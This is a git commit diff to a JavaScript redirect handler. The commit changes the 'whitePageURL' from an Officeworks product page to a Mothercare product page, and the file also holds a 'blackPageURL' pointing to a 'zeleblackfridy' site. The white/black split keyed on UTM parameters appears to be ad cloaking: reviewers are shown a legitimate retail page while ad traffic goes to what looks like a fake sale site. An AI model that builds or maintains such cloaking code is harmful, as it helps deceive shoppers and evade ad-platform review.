57d2750a8fac55dc730b0d459dbc5c59a3abab64
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-22 20:36:19 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.officeworks.com.au/shop/officeworks/p/otto-on-the-go-qi2-wireless-magnetic-power-bank-black-ottgpowbk";
+    const whitePageURL = "https://www.mothercare.com.sa/en/buy-mothercare-lion-bouncer";
     const blackPageURL = "https://zeleblackfridy.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
